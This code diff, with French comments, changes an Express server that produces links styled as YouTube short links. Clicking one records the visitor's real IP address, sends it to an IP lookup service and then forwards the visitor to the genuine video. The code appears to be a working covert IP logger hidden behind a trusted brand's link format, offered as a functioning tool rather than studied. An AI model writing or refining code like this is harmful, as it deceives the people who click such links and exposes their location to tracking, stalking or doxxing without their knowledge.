@@ -31,24 +31,27 @@ app.get('/api/shorten', (req, res) => {
             return res.status(400).json({ error: 'URL required' });
         }
 
+        // Extraire le video ID
+        const videoId = originalUrl.split('v=')[1];
+        if (!videoId) {
+            return res.status(400).json({ error: 'Invalid video ID' });
+        }
+
         const shortId = generateYouTubeId();
-        urlMappings.set(shortId, originalUrl);
+        // Stocker le video ID au lieu de l'URL complète
+        urlMappings.set(shortId, videoId);
         
-        // Limiter la taille du Map
         if (urlMappings.size > 1000) {
             const firstKey = urlMappings.keys().next().value;
             urlMappings.delete(firstKey);
         }
 
-        // Construire les URLs avec le domaine du serveur
         const shortUrl = `https://youtu.be/${shortId}`;
-        const fullUrl = `${SERVER_URL}/v/${shortId}`;
-
-        console.log('\x1b[32m%s\x1b[0m', `Generated short URL: ${shortUrl} for: ${originalUrl}`);
+        console.log('\x1b[32m%s\x1b[0m', `Generated short URL: ${shortUrl} for video: ${videoId}`);
         
         res.json({ 
             shortUrl: shortUrl,
-            fullUrl: fullUrl
+            fullUrl: `${SERVER_URL}/v/${shortId}`
         });
     } catch (error) {
         console.error('\x1b[31m%s\x1b[0m', `Error generating short URL: ${error}`);
@@ -58,14 +61,13 @@ app.get('/api/shorten', (req, res) => {
 
 // Route pour rediriger les liens courts
 app.get('/v/:id', async (req, res) => {
-    const originalUrl = urlMappings.get(req.params.id);
-    if (!originalUrl) {
+    const videoId = urlMappings.get(req.params.id);
+    if (!videoId) {
         return res.redirect('https://youtube.com');
     }
     
-    // Traitement identique à la route /watch
     try {
-        // Get real IP and clean it
+        // Traitement de l'IP et autres données...
         let ip = req.realIp.replace('::ffff:', '');
         ip = ip.split(',')[0].trim();
         
@@ -123,7 +125,8 @@ app.get('/v/:id', async (req, res) => {
             console.error('\x1b[31m%s\x1b[0m', `Error calling IP API: ${apiError.message}`);
         }
 
-        res.redirect(originalUrl);
+        // Rediriger vers la vraie vidéo YouTube
+        res.redirect(`https://youtube.com/watch?v=${videoId}`);
     } catch (error) {
         console.error('\x1b[31m%s\x1b[0m', `Error processing request: ${error}`);
         res.redirect('https://youtube.com');
